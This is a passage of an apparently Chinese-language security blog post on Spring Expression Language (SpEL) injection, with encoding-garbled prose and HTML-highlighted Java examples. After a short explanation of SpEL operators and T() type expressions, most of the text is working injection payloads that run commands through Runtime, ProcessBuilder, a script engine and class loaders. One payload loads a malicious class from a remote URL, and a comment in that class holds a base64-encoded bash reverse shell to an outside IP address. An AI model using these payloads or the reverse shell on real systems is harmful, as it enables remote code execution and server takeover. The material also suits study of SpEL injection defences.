aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¼•ç”¨ç±»å±æ€§å’Œå¼•ç”¨ç±»æ–¹æ³•æ‡’å¾—å†™äº†ï¼ˆ</p><hr><h3 id="å¸¸è§çš„è¡¨è¾¾å¼"><a href="#å¸¸è§çš„è¡¨è¾¾å¼" class="headerlink" title="å¸¸è§çš„è¡¨è¾¾å¼"></a>å¸¸è§çš„è¡¨è¾¾å¼</h3><p>ä¸€äº›æ¯”è¾ƒå¸¸è§çš„è¡¨è¾¾å¼ï¼š</p><table><thead><tr><th>è¿ç®—ç¬¦ç±»å‹</th><th>è¿ç®—ç¬¦</th></tr></thead><tbody><tr><td>ç®—æ•°è¿ç®—</td><td>+, -, *, &#x2F;, %, ^</td></tr><tr><td>å…³ç³»è¿ç®—</td><td>&lt;, &gt;, &#x3D;&#x3D;, &lt;&#x3D;, &gt;&#x3D;, lt, gt, eq, le, ge</td></tr><tr><td>é€»è¾‘è¿ç®—</td><td>and, or, not, !</td></tr><tr><td>æ¡ä»¶è¿ç®—</td><td>?:(ternary), ?:(Elvis)</td></tr><tr><td>æ­£åˆ™è¡¨è¾¾å¼</td><td>matches</td></tr></tbody></table><table><thead><tr><th>è¿ç®—ç¬¦</th><th>ç¬¦å·</th><th>æ–‡æœ¬ç±»å‹</th></tr></thead><tbody><tr><td>ç­‰äº</td><td>&#x3D;&#x3D;</td><td>eq</td></tr><tr><td>å°äº</td><td>&lt;</td><td>lt</td></tr><tr><td>å°äºç­‰äº</td><td>&lt;&#x3D;</td><td>le</td></tr><tr><td>å¤§äº</td><td>&gt;</td><td>gt</td></tr><tr><td>å¤§äºç­‰äº</td><td>&gt;&#x3D;</td><td>ge</td></tr></tbody></table><hr><h2 id="å˜é‡å®šä¹‰å’Œå¼•ç”¨"><a href="#å˜é‡å®šä¹‰å’Œå¼•ç”¨" class="headerlink" title="å˜é‡å®šä¹‰å’Œå¼•ç”¨"></a>å˜é‡å®šä¹‰å’Œå¼•ç”¨</h2><p>åœ¨SpELè¡¨è¾¾å¼ä¸­ï¼Œå˜é‡å®šä¹‰é€šè¿‡<code>EvaluationContext</code>ç±»çš„<code>setVariable(variableName, value)</code>å‡½æ•°æ¥å®ç°ï¼›åœ¨è¡¨è¾¾å¼ä¸­ä½¿ç”¨&quot;#variableName&quot;æ¥å¼•ç”¨ï¼›é™¤äº†å¼•ç”¨è‡ªå®šä¹‰å˜é‡ï¼ŒSpELè¿˜å…è®¸å¼•ç”¨æ ¹å¯¹è±¡åŠå½“å‰ä¸Šä¸‹æ–‡å¯¹è±¡ï¼š</p><ul><li>#thisï¼šä½¿ç”¨å½“å‰æ­£åœ¨è®¡ç®—çš„ä¸Šä¸‹æ–‡ï¼›</li><li>#rootï¼šå¼•ç”¨å®¹å™¨çš„rootå¯¹è±¡ï¼›</li><li>@somethingï¼šå¼•ç”¨Bean</li></ul><hr><h2 id="ç±»å‹è¡¨è¾¾å¼T"><a href="#ç±»å‹è¡¨è¾¾å¼T" class="headerlink" title="ç±»å‹è¡¨è¾¾å¼T()"></a>ç±»å‹è¡¨è¾¾å¼T()</h2><blockquote><p>åœ¨ SpEL è¡¨è¾¾å¼ä¸­ï¼Œä½¿ç”¨ <code>T(Type)</code> è¿ç®—ç¬¦ä¼šè°ƒç”¨ç±»çš„ä½œç”¨åŸŸå’Œæ–¹æ³•ã€‚æ¢å¥è¯è¯´ï¼Œå°±æ˜¯å¯ä»¥é€šè¿‡è¯¥ç±»ç±»å‹è¡¨è¾¾å¼æ¥æ“ä½œç±»ã€‚</p></blockquote><p>ä½¿ç”¨ <code>T(Type)</code> æ¥è¡¨ç¤º <code>java.lang.Class</code> å®ä¾‹ï¼ŒType å¿…é¡»æ˜¯ç±»å…¨é™å®šåï¼Œä½† <code>java.lang</code> åŒ…é™¤å¤–ï¼Œå› ä¸º SpEL å·²ç»å†…ç½®äº†è¯¥åŒ…ï¼Œå³è¯¥åŒ…ä¸‹çš„ç±»å¯ä»¥ä¸æŒ‡å®šå…·ä½“çš„åŒ…åï¼›ä½¿ç”¨ç±»ç±»å‹è¡¨è¾¾å¼è¿˜å¯ä»¥è¿›è¡Œè®¿é—®ç±»é™æ€æ–¹æ³•å’Œç±»é™æ€å­—æ®µ</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ<code>java.lang.Runtime</code> è¿™ä¸ªåŒ…ä¹Ÿæ˜¯åŒ…å«äº <code>java.lang</code> çš„åŒ…çš„ï¼Œæ‰€ä»¥å¦‚æœèƒ½è°ƒç”¨ <code>Runtime</code> å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"T(java.lang.String)"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ›å»ºè§£æå™¨</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// è§£æè¡¨è¾¾å¼</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// æ‰§è¡Œ</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240719145300158.png" alt="image-20240719145300158"></p><p>Tä¸­çš„å†…å®¹ä¼šè¢«è§£æä¸ºä¸€ä¸ªç±»ã€‚æ¯”å¦‚å›¾ä¸­çš„Stringï¼Œé‚£ä¹ˆå½“ç„¶å¯ä»¥è§£æä¸º<code>java.lang.Runtime</code>ï¼Œå› æ­¤ä¹Ÿå°±æœ‰äº†å‘½ä»¤æ‰§è¡Œ</p><p>åªéœ€è¦æ”¹ä¸º<code>T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)</code>å°±èƒ½å¼¹è®¡ç®—å™¨</p><hr><h1 id="æ³¨å…¥"><a href="#æ³¨å…¥" class="headerlink" title="æ³¨å…¥"></a>æ³¨å…¥</h1><h2 id="RCE-ver1â€”â€”ç›´æ¥RCE"><a href="#RCE-ver1â€”â€”ç›´æ¥RCE" class="headerlink" title="RCE ver1â€”â€”ç›´æ¥RCE"></a>RCE ver1â€”â€”ç›´æ¥RCE</h2><h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"new java.lang.ProcessBuilder(new String[]&#123;\"calc\"&#125;).start()"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºè§£æå™¨</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§£æè¡¨è¾¾å¼</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¼¹å‡ºè®¡ç®—å™¨</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240719150401829.png" alt="image-20240719150401829"></p><hr><h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"T(java.lang.Runtime).getRuntime().exec('calc')"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºè§£æå™¨</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§£æè¡¨è¾¾å¼</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¼¹å‡ºè®¡ç®—å™¨</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="ScriptEngine"><a href="#ScriptEngine" class="headerlink" title="ScriptEngine"></a>ScriptEngine</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\")"</span><span class="token punctuation">;</span><span class="token comment">// engineä¹Ÿå¯ä»¥ç”¨javascript</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºè§£æå™¨</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§£æè¡¨è¾¾å¼</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¼¹å‡ºè®¡ç®—å™¨</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„è¿™é‡Œä¸æ˜¯<code>T()</code>ï¼Œå› ä¸º <code>getEngineByName</code> ä¸æ˜¯ static æ–¹æ³•ï¼Œä¸è¿‡å¯ä»¥ç›´æ¥new</p><hr><h2 id="RCE-ver2â€”â€”è¿œç¨‹ç±»åŠ è½½"><a href="#RCE-ver2â€”â€”è¿œç¨‹ç±»åŠ è½½" class="headerlink" title="RCE ver2â€”â€”è¿œç¨‹ç±»åŠ è½½"></a>RCE ver2â€”â€”è¿œç¨‹ç±»åŠ è½½</h2><h3 id="UrlClassloader"><a href="#UrlClassloader" class="headerlink" title="UrlClassloader"></a>UrlClassloader</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL('http://127.0.0.1:8888/')&#125;).loadClass(\"evil\").newInstance()"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºè§£æå™¨</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§£æè¡¨è¾¾å¼</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¼¹å‡ºè®¡ç®—å™¨</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬åœ°æ¶æ„ç±»ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> evil <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//Runtime.getRuntime().exec("bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;");</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="AppClassloader"><a href="#AppClassloader" class="headerlink" title="AppClassloader"></a>AppClassloader</h3><p>è·å–ClassLoaderå»åŠ è½½æœ¬åœ°çš„ç±»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºè§£æå™¨</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§£æè¡¨è¾¾å¼</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token 